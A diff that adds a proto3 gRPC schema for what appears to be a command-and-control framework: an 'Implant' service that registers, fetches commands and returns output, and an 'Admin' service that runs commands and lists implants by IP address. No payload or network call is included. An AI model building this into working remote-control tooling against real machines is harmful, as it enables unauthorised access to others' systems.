@@ -1,0 +1,34 @@
+syntax = "proto3";
+option go_package = "./;grpcapi";
+package grpcapi;
+
+service Implant {
+    rpc FetchCommand (Empty) returns (Command);
+    rpc SendOutput (Command) returns (Empty);
+    rpc RegisterNewImplant (Empty) returns (RegisterResponse);
+}
+
+service Admin {
+    rpc RunCommand (Command) returns (Command);
+    rpc ListRegisteredImplants (Empty) returns (ImplantsList);
+}
+
+message Command {
+    string In = 1;
+    string Out = 2;
+}
+
+message Empty {}
+
+message ImplantData {
+    string id = 1;
+    string ip_address = 2;
+}
+
+message ImplantsList {
+    repeated ImplantData implants = 1;
+}
+
+message RegisterResponse {
+    string id = 1;
+}
